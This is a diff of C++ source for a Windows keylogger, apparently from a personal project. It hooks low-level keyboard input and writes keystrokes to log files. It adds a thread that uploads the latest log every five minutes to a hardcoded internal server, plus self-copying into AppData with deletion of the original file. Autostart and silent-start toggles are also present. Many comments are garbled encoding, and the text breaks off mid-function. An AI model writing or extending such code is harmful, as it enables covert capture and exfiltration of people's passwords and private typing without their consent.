@@ -1,8 +1,6 @@
 #define UNICODE
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#pragma comment(lib, "Ws2_32.lib")
-
 #include <windows.h>
 #include <iostream>
 #include <fstream>
@@ -12,19 +10,25 @@
 #include <regex>
 #include <algorithm>
 #include <curl/curl.h>
-#include <json/json.h>          // 修改此处
+#include <nlohmann/json.hpp>    
 #include <cstring>
 #include <cstdio>
 #include <sstream>
 #include <time.h>
 #include <map>
 #include <shlwapi.h>
+#include <shellapi.h>
+#include <atomic>
+#include <shlobj.h>          // SHGetFolderPath
+#include <objbase.h>         // CoInitialize, CoUninitialize
+#include <shobjidl.h>        // IShellLink
+#pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "Shlwapi.lib")
-
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "uuid.lib")
 
 using json = nlohmann::json;
 namespace fs = std::filesystem;
-
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -46,6 +50,17 @@ namespace fs = std::filesystem;
 
 bool isRecording = true;
 HHOOK _hook;
+
+// �ϴ����ܿ��Ʊ���
+std::atomic<bool> uploadEnabled{ false };
+std::atomic<bool> uploadThreadRunning{ false };
+HANDLE hUploadThread = NULL;        // �ϴ��߳̾��
+
+// ---------------------- ǰ������ ----------------------
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
+std::string readFileContent(const std::string& filePath);
+std::string getExecutableDir();
+// ----------------------------------------------------
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
@@ -80,6 +95,90 @@ const std::map<int, std::string> keyname{
     {VK_CAPITAL,	"[CAPSLOCK]" },
 };
 #endif
+// ȫ�ֱ��������ڴ洢����ͼ�� ID �ʹ��ھ��
+static HWND g_hNotifyWnd = NULL;
+static UINT g_nNotifyId = 0;
+
+// ���ش��ڵ���Ϣ��������
+LRESULT CALLBACK NotifyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    return DefWindowProc(hWnd, msg, wParam, lParam);
+}
+
+// ��ʼ�����ش��ڣ���һ�Σ�
+void InitNotifyWindow()
+{
+    if (g_hNotifyWnd != NULL) return;
+    WNDCLASS wc = { 0 };
+    wc.lpfnWndProc = NotifyWndProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.lpszClassName = L"KeyloggerNotifyClass";
+    RegisterClass(&wc);
+    g_hNotifyWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);
+    if (g_hNotifyWnd) g_nNotifyId = (UINT)(ULONG_PTR)g_hNotifyWnd;
+}
+
+// ��ʾ֪ͨ�����ݣ���ʧ��ʱ���˵� MessageBox
+void ShowToastNotification(const std::wstring& title, const std::wstring& content)
+{
+    InitNotifyWindow();  // ȷ�����ش��ڴ���
+    if (!g_hNotifyWnd)
+    {
+        MessageBox(NULL, content.c_str(), title.c_str(), MB_OK);
+        return;
+    }
+
+    NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
+    nid.hWnd = g_hNotifyWnd;
+    nid.uID = g_nNotifyId;
+    nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO;
+    nid.dwInfoFlags = NIIF_INFO;
+    wcscpy_s(nid.szInfo, content.c_str());
+    wcscpy_s(nid.szInfoTitle, title.c_str());
+    // ʹ��Ĭ��ͼ�꣨�ɴӳ�����Դ���أ��˴��ñ�׼Ӧ��ͼ�꣩
+    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+
+    // ��������ͼ�꣨����Ѵ��ڣ����޸ģ�
+    if (!Shell_NotifyIconW(NIM_ADD, &nid))
+    {
+        // �������ʧ�ܣ���������Ϊ����ͼ�꣬�����޸�
+        Shell_NotifyIconW(NIM_MODIFY, &nid);
+    }
+    else
+    {
+        // �����ӵ�ͼ�꣬��Ҫ�ӳ�ɾ���Ա������
+        // ����һ���̣߳�10���ɾ��ͼ��
+        struct DelayedCleanupData {
+            HWND hWnd;
+            UINT uID;
+        } *pData = new DelayedCleanupData{ g_hNotifyWnd, g_nNotifyId };
+        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
+            DelayedCleanupData* data = (DelayedCleanupData*)p;
+            Sleep(10000);  // �ȴ�10�룬ȷ��������ʾ���
+            NOTIFYICONDATAW delNid = { sizeof(NOTIFYICONDATAW) };
+            delNid.hWnd = data->hWnd;
+            delNid.uID = data->uID;
+            Shell_NotifyIconW(NIM_DELETE, &delNid);
+            delete data;
+            return 0;
+            }, pData, 0, NULL);
+        if (hThread) CloseHandle(hThread);
+    }
+}
+
+// �ڳ����˳�ʱ��������ͼ�꣨��ѡ�����Ƽ���
+void CleanupNotifyIcon()
+{
+    if (g_hNotifyWnd)
+    {
+        NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
+        nid.hWnd = g_hNotifyWnd;
+        nid.uID = g_nNotifyId;
+        Shell_NotifyIconW(NIM_DELETE, &nid);
+        DestroyWindow(g_hNotifyWnd);
+        g_hNotifyWnd = NULL;
+    }
+}
 
 KBDLLHOOKSTRUCT kbdStruct;
 
@@ -90,8 +189,6 @@ void ReleaseHook()
 {
     UnhookWindowsHookEx(_hook);
 }
-
-
 
 int Save(int key_stroke)
 {
@@ -200,7 +297,7 @@ const wchar_t* APP_NAME = L"MyKeylogger";
 // 获取当前程序完整路径
 std::wstring GetModulePath()
 {
-    wchar_t path[MAX_PATH] = {0};
+    wchar_t path[MAX_PATH] = { 0 };
     GetModuleFileNameW(NULL, path, MAX_PATH);
     return std::wstring(path);
 }
@@ -284,7 +381,7 @@ std::string GetLocalIPAddress()
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         return ip;
 
-    char hostname[256] = {0};
+    char hostname[256] = { 0 };
     if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
     {
         WSACleanup();
@@ -310,7 +407,7 @@ std::string GetLocalIPAddress()
     {
         if (ptr->ai_family == AF_INET)
         {
-            char ipstr[INET_ADDRSTRLEN] = {0};
+            char ipstr[INET_ADDRSTRLEN] = { 0 };
             sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
             InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
             std::string candidate(ipstr);
@@ -344,13 +441,36 @@ std::string GetLocalIPAddress()
 
 std::string GetDateString()
 {
-    char buf[32] = {0};
+    char buf[32] = { 0 };
     time_t t = time(NULL);
     struct tm tm_info;
     localtime_s(&tm_info, &t);
     // 格式：YYYYMMDD
     strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
     return std::string(buf);
+}
+
+// ��ȡ��־Ŀ¼��%appdata%\Keylogger��
+std::string GetLogDirectory()
+{
+    wchar_t path[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
+    {
+        std::wstring appdata(path);
+        std::wstring logDirW = appdata + L"\\Keylogger";
+        // ȷ��Ŀ¼����
+        if (!fs::exists(logDirW))
+        {
+            fs::create_directories(logDirW);
+        }
+        // ת��Ϊ���ֽ��ַ���
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
+        std::string logDir(size_needed, 0);
+        WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
+        return logDir;
+    }
+    // ���ʧ�ܣ����ص�ǰĿ¼
+    return ".\\";
 }
 
 std::string MakeOutputFilename()
@@ -363,111 +483,24 @@ std::string MakeOutputFilename()
             c = '-';
     }
     std::string date = GetDateString();
-    return ip + "_" + date + ".log";
+    std::string filename = ip + "_" + date + ".log";
+    // ƴ����־Ŀ¼
+    std::string logDir = GetLogDirectory();
+    return logDir + "\\" + filename;
 }
 
-LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
-{
-    if (nCode >= 0)
-    {
-        // the action is valid: HC_ACTION.
-        if (wParam == WM_KEYDOWN)
-        {
-            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+// ---------- �ϴ�������غ��� ----------
 
-            // Check for Ctrl + Shift + Alt + P
-            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                isRecording = !isRecording;
-                if (isRecording)
-                {
-                    std::cout << "录制继续\n";
-                    MessageBox(NULL, L"继续录(/≧▽≦)/", L"录制继续", MB_OK);
-                }
-                else
-                {
-                    std::cout << "录制暂停\n";
-                    MessageBox(NULL, L"不录啦╰(￣ω￣ｏ)", L"录制暂停", MB_OK);
-                }
-            }
-            // Check for Ctrl + Shift + Alt + Q
-            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                MessageBox(NULL, L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束", MB_OK);
-                std::cout << "录制结束\n";
-                ReleaseHook();
-                output_file.close();
-                exit(0);
-            }
-            // Check for Ctrl + Shift + Alt + S (开机自启)
-            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                bool enabled = IsAutoStartEnabled();
-                if (SetAutoStart(!enabled))
-                {
-                    if (!enabled)
-                        MessageBox(NULL, L"已设置为开机自啟 awa", L"自启设置", MB_OK);
-                    else
-                        MessageBox(NULL, L"已取消开机自启 qaq", L"自启设置", MB_OK);
-                }
-                else
-                {
-                    MessageBox(NULL, L"自启设置失败，请以管理员身份运行w", L"自启设置", MB_OK | MB_ICONERROR);
-                }
-            }
-            // Check for Ctrl + Shift + Alt + D (静默启动)
-            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                bool silent = IsSilentMode();
-                if (SetSilentMode(!silent))
-                {
-                    if (!silent)
-                        MessageBox(NULL, L"已设置为静默启动（下次启动不再弹窗）", L"静默启动", MB_OK);
-                    else
-                        MessageBox(NULL, L"已取消静默启动（下次启动会弹窗）", L"静默启动", MB_OK);
-                }
-                else
-                {
-                    MessageBox(NULL, L"设置静默启动失败，请以管理员身份运行", L"静默启动", MB_OK | MB_ICONERROR);
-                }
-            }
-            else
-            {
-                // save to file only if recording
-                if (isRecording)
-                {
-                    Save(kbdStruct.vkCode);
-                }
-            }
-        }
+// CURL �ص�������������Ӧ����
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
+    size_t newLength = size * nmemb;
+    try {
+        s->append((char*)contents, newLength);
     }
-
-    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
-    return CallNextHookEx(_hook, nCode, wParam, lParam);
-}
-
-void SetHook()
-{
-    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
-    {
-        LPCWSTR a = L"Failed to install hook!";
-        LPCWSTR b = L"Error";
-        MessageBox(NULL, a, b, MB_ICONERROR);
+    catch (std::bad_alloc& e) {
+        return 0;
     }
-}
-
-// 获取程序当前执行目录
-std::string getExecutableDir() {
-    char exePath[MAX_PATH];
-    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
-    if (len == 0) {
-        std::cerr << "获取程序路径失败，错误码: " << GetLastError() << std::endl;
-        return "";
-    }
-    std::string path(exePath, len);
-    size_t lastSlash = path.find_last_of("\\/");
-    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
+    return newLength;
 }
 
 // 读取文件内容到内存（用于上传）
@@ -487,16 +520,58 @@ std::string readFileContent(const std::string& filePath) {
     return buffer;
 }
 
-// CURL 回调函数：捕获响应数据
-size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
-    size_t newLength = size * nmemb;
-    try {
-        s->append((char*)contents, newLength);
+// ��ȡ����ǰִ��Ŀ¼��ע�⣺�˺��������ϴ����ܣ��˴�������
+std::string getExecutableDir() {
+    char exePath[MAX_PATH];
+    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    if (len == 0) {
+        std::cerr << "��ȡ����·��ʧ�ܣ�������: " << GetLastError() << std::endl;
+        return "";
     }
-    catch (std::bad_alloc& e) {
-        return 0;
+    std::string path(exePath, len);
+    size_t lastSlash = path.find_last_of("\\/");
+    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
+}
+
+// ɸѡ���ϸ�ʽ����־�ļ����������µ�һ��
+std::string findLatestLogFile(const std::string& dir) {
+    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
+        std::cerr << "Ŀ¼�����ڻ���Ч: " << dir << std::endl;
+        return "";
     }
-    return newLength;
+
+    // �������ʽ��ƥ�� <IP>_<YYYYMMDD>.log ��ʽ
+    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
+    std::smatch match;
+
+    std::vector<std::pair<std::string, std::string>> validLogs;  // �洢���ļ��������ڣ�
+
+    // ����Ŀ¼�µ������ļ�
+    for (const auto& entry : fs::directory_iterator(dir)) {
+        if (entry.is_regular_file()) {  // ֻ�����ļ�
+            std::string fileName = entry.path().filename().string();
+            if (std::regex_match(fileName, match, logPattern)) {
+                // ��ȡ���ڲ��֣���2�������飩
+                std::string dateStr = match[2].str();
+                validLogs.emplace_back(fileName, dateStr);
+                std::cout << "���ַ��ϸ�ʽ����־�ļ�: " << fileName << "������: " << dateStr << "��" << std::endl;
+            }
+        }
+    }
+
+    if (validLogs.empty()) {
+        std::cerr << "δ�ҵ����ϸ�ʽ����־�ļ���<IP>_<YYYYMMDD>.log��" << std::endl;
+        return "";
+    }
+
+    // �����ڽ����������µ�������ǰ�棩
+    std::sort(validLogs.begin(), validLogs.end(),
+        [](const auto& a, const auto& b) {
+            return a.second > b.second;  // �����ַ���ֱ�ӱȽϣ�YYYYMMDD ��ʽ��ֱ������
+        });
+
+    // ���������ļ�������·��
+    return dir + "\\" + validLogs[0].first;
 }
 
 // 获取 token
@@ -545,132 +620,392 @@ std::string api_get() {
     return "";
 }
 
-// 上传文件到服务器
-void uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath) {
+// �ϴ��ļ���������
+bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
+{
     if (token.empty()) {
-        std::cerr << "token 为空，无法上传" << std::endl;
-        return;
+        std::cerr << "token Ϊ�գ��޷��ϴ�" << std::endl;
+        return false;
     }
 
     std::string fileContent = readFileContent(localFilePath);
     if (fileContent.empty()) {
-        return;
+        return false;
     }
 
     CURL* curl = curl_easy_init();
-    if (curl) {
-        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
-        curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
-        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-
-        struct curl_slist* headers = NULL;
-        headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
-        headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
-        headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
-        headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());
-
-        std::string response;
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
-
-        CURLcode res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            std::cerr << "上传失败: " << curl_easy_strerror(res) << std::endl;
-        }
-        else {
-            std::cout << "上传响应: " << response << std::endl;
-        }
-
-        curl_easy_cleanup(curl);
-        curl_slist_free_all(headers);
+    if (!curl) {
+        std::cerr << "curl ��ʼ��ʧ��" << std::endl;
+        return false;
     }
-    else {
-        std::cerr << "curl 初始化失败" << std::endl;
+
+    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
+    curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+
+    struct curl_slist* headers = NULL;
+    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
+    headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
+    headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
+    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());
+
+    std::string response;
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+    CURLcode res = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+    curl_slist_free_all(headers);
+
+    if (res != CURLE_OK) {
+        std::cerr << "�ϴ�ʧ��: " << curl_easy_strerror(res) << std::endl;
+        return false;
+    }
+    std::cout << "�ϴ���Ӧ: " << response << std::endl;
+    // �ɸ�����Ҫ���� response �ж��Ƿ�ɹ����˴�����Ϊ��Ӧ�ǿռ��ɹ�
+    return true;
+}
+// �ϴ�������־�ļ��ķ�װ����
+void uploadLatestLog()
+{
+    // 1. ��ȡ token
+    std::string token = api_get();
+    if (token.empty()) {
+        std::cerr << "��ȡ token ʧ�ܣ������ϴ�" << std::endl;
+        ShowToastNotification(L"�ϴ�����", L"��ȡ��¼ƾ֤ʧ�ܣ����Զ��ر��ϴ�����");
+        uploadEnabled = false;
+        uploadThreadRunning = false;
+        return;
+    }
+
+    // 2. ��ȡ��־Ŀ¼
+    std::string logDir = GetLogDirectory();
+    if (logDir.empty()) return;
+
+    // 3. �������µ���־�ļ�
+    std::string latestLogPath = findLatestLogFile(logDir);
+    if (latestLogPath.empty()) return;
+
+    // 4. ���÷�����·��
+    fs::path logPath(latestLogPath);
+    std::string fileName = logPath.filename().string();
+    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;
+
+    // 5. �ϴ��ļ�
+    bool success = uploadFile(token, latestLogPath, serverFile);
+    if (!success) {
+        std::cerr << "�ϴ�ʧ�ܣ����Զ��ر��ϴ�����" << std::endl;
+        ShowToastNotification(L"�ϴ�����", L"�ļ��ϴ�ʧ�ܣ����Զ��ر��ϴ�����");
+        uploadEnabled = false;
+        uploadThreadRunning = false;
     }
 }
 
-// 筛选符合格式的日志文件并返回最新的一个
-std::string findLatestLogFile(const std::string& dir) {
-    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
-        std::cerr << "目录不存在或无效: " << dir << std::endl;
-        return "";
+// �ϴ��̺߳���
+DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
+{
+    while (uploadEnabled && uploadThreadRunning)
+    {
+        uploadLatestLog();
+        for (int i = 0; i < 300 && uploadEnabled && uploadThreadRunning; ++i)
+            Sleep(1000);
     }
+    uploadThreadRunning = false;
+    return 0;
+}
+// ---------- ���̹��ӻص����� ----------
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode >= 0)
+    {
+        // the action is valid: HC_ACTION.
+        if (wParam == WM_KEYDOWN)
+        {
+            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-    // 正则表达式：匹配 <IP>_<YYYYMMDD>.log 格式
-    // IP 格式：xxx.xxx.xxx.xxx（简单匹配，不严格验证 IP 合法性）
-    // 日期格式：YYYYMMDD（8位数字）
-    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
-    std::smatch match;
-
-    std::vector<std::pair<std::string, std::string>> validLogs;  // 存储（文件名，日期）
-
-    // 遍历目录下的所有文件
-    for (const auto& entry : fs::directory_iterator(dir)) {
-        if (entry.is_regular_file()) {  // 只处理文件
-            std::string fileName = entry.path().filename().string();
-            if (std::regex_match(fileName, match, logPattern)) {
-                // 提取日期部分（第2个捕获组）
-                std::string dateStr = match[2].str();
-                validLogs.emplace_back(fileName, dateStr);
-                std::cout << "发现符合格式的日志文件: " << fileName << "（日期: " << dateStr << "）" << std::endl;
+            // Check for Ctrl + Shift + Alt + P
+            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                isRecording = !isRecording;
+                if (isRecording)
+                {
+                    std::cout << "¼�Ƽ���\n";
+                    ShowToastNotification(L"����¼(/�R���Q)/", L"¼�Ƽ���");
+                }
+                else
+                {
+                    std::cout << "¼����ͣ\n";
+                    ShowToastNotification(L"��¼���t(���أ���)", L"¼����ͣ");
+                }
+            }
+            // Check for Ctrl + Shift + Alt + Q
+            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                ShowToastNotification(L"�治¼����*�b�`�b*��\n\n�ǰݰ���(o�b���b)o��", L"¼�ƽ���");
+                std::cout << "¼�ƽ���\n";
+                Sleep(2000);
+                CleanupNotifyIcon();   // ��������ͼ��
+                ReleaseHook();
+                output_file.close();
+                exit(0);
+            }
+            // Check for Ctrl + Shift + Alt + S (��������)
+            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                bool enabled = IsAutoStartEnabled();
+                if (SetAutoStart(!enabled))
+                {
+                    if (!enabled)
+                        ShowToastNotification(L"������Ϊ�����Ԇ� awa", L"��������");
+                    else
+                        ShowToastNotification(L"��ȡ���������� qaq", L"��������");
+                }
+                else
+                {
+                    ShowToastNotification(L"��������ʧ�ܣ����Թ���Ա��������w", L"��������");
+                }
+            }
+            // Check for Ctrl + Shift + Alt + D (��Ĭ����)
+            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                bool silent = IsSilentMode();
+                if (SetSilentMode(!silent))
+                {
+                    if (!silent)
+                        ShowToastNotification(L"������Ϊ��Ĭ�������´��������ٵ�����", L"��Ĭ����");
+                    else
+                        ShowToastNotification(L"��ȡ����Ĭ�������´������ᵯ����", L"��Ĭ����");
+                }
+                else
+                {
+                    ShowToastNotification(L"���þ�Ĭ����ʧ�ܣ����Թ���Ա��������", L"��Ĭ����");
+                }
+            }
+            // Check for Ctrl + Shift + Alt + U (�ϴ�����)
+            else if (kbdStruct.vkCode == 'U' && (GetKeyState(VK_CONTROL) & 0x8000) &&
+                (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                bool newState = !uploadEnabled;
+                if (newState)
+                {
+                    // ����߳�δ���У�����֮ǰ�����رգ������������߳�
+                    if (!uploadThreadRunning)
+                    {
+                        uploadThreadRunning = true;
+                        hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
+                        if (hUploadThread)
+                            CloseHandle(hUploadThread);
+                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������������ϴ���־�ļ�");
+                    }
+                    else
+                    {
+                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������߳��������У�");
+                    }
+                    uploadEnabled = true;
+                }
+                else
+                {
+                    uploadEnabled = false;
+                    uploadThreadRunning = false;
+                    if (hUploadThread)
+                        WaitForSingleObject(hUploadThread, 5000);
+                    ShowToastNotification(L"�ϴ�����", L"�ϴ������ѹر�");
+                }
+            }
+            else
+            {
+                // save to file only if recording
+                if (isRecording)
+                {
+                    Save(kbdStruct.vkCode);
+                }
             }
         }
     }
 
-    if (validLogs.empty()) {
-        std::cerr << "未找到符合格式的日志文件（<IP>_<YYYYMMDD>.log）" << std::endl;
-        return "";
-    }
-
-    // 按日期降序排序（最新的日期在前面）
-    std::sort(validLogs.begin(), validLogs.end(),
-        [](const auto& a, const auto& b) {
-            return a.second > b.second;  // 日期字符串直接比较（YYYYMMDD 格式可直接排序）
-        });
-
-    // 返回最新文件的完整路径
-    return dir + validLogs[0].first;
+    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
+    return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
+void SetHook()
+{
+    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+    {
+        LPCWSTR a = L"Failed to install hook!";
+        LPCWSTR b = L"Error";
+        MessageBox(NULL, a, b, MB_ICONERROR);
+    }
+}
 
+// ==================== �������ܣ��Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ ====================
+
+// ������ݷ�ʽ��ͨ�ã�
+bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
+{
+    // �����ݷ�ʽ�Ѵ��ڣ����ظ�����
+    if (fs::exists(shortcutPath))
+        return true;
+
+    CoInitialize(NULL);
+    IShellLinkW* psl = NULL;
+    IPersistFile* ppf = NULL;
+    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
+    if (SUCCEEDED(hr))
+    {
+        psl->SetPath(targetPath.c_str());
+        psl->SetDescription(L"Keyboard Logger");
+        hr = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
+        if (SUCCEEDED(hr))
+        {
+            hr = ppf->Save(shortcutPath.c_str(), TRUE);
+            ppf->Release();
+        }
+        psl->Release();
+    }
+    CoUninitialize();
+    return SUCCEEDED(hr);
+}
+
+// �����Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ
+void HandleSelfCopyAndDelete()
+{
+    // ��ȡĿ��Ŀ¼��%appdata%\Keylogger
+    wchar_t appdataPath[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
+        return;
+
+    std::wstring targetDir = std::wstring(appdataPath) + L"\\Keylogger";
+    fs::create_directories(targetDir);
+
+    std::wstring currentExe = GetModulePath();
+    std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();
+
+    // �����ǰ������Ŀ��Ŀ¼����ִ�и��ơ�������ݷ�ʽ��������ɾ��
+    if (currentExe != targetExe)
+    {
+        // ����������Ŀ��Ŀ¼
+        if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
+        {
+            MessageBoxW(NULL, L"���������� %appdata%\\Keylogger ʧ��", L"����", MB_ICONERROR);
+            return;
+        }
+
+        // ��ԭ��������Ŀ¼����ָ���³���Ŀ�ݷ�ʽ
+        std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
+        std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
+        std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
+        CreateShortcut(targetExe, shortcutPath);
+
+        // �����³��򣬴���ԭ����·���Ա�ɾ��
+        std::wstring params = L"--delete-old \"" + currentExe + L"\"";
+        wchar_t paramsBuf[1024];
+        wcscpy_s(paramsBuf, params.c_str());
+
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        if (CreateProcessW(targetExe.c_str(), paramsBuf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+        {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            ExitProcess(0);   // ��ǰ�����˳�
+        }
+        else
+        {
+            MessageBoxW(NULL, L"��������ʧ��", L"����", MB_ICONERROR);
+        }
+    }
+    else
+    {
+        // �Ѿ���Ŀ��Ŀ¼������Ƿ���ɾ�����ļ�������
+        int argc;
+        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+        if (argc >= 3 && wcscmp(argv[1], L"--delete-old") == 0)
+        {
+            std::wstring oldPath = argv[2];
+            // �ȴ�ԭ������ȫ�˳��������ӳ٣�
+            Sleep(5000);  // 5�룬�㹻ԭ�����˳�
+
+            // ����ɾ�������Զ��
+            bool deleted = false;
+            DWORD lastError = 0;
+            for (int i = 0; i < 10; ++i)
+            {
+                // ����ļ��Ƿ����
+                if (!fs::exists(oldPath))
+                {
+                    deleted = true;
+                    break;
+                }
+
+                // �Ƴ�ֻ�����ԣ�����У�
+                SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+                // ����ɾ��
+                if (DeleteFileW(oldPath.c_str()))
+                {
+                    deleted = true;
+                    break;
+                }
+
+                lastError = GetLastError();
+                // ����ļ���ռ�ã��ȴ�����
+                if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
+                {
+                    Sleep(1000);
+                    continue;
+                }
+                else
+                {
+                    // ����������������
+                    break;
+                }
+            }
+
+            if (!deleted)
+            {
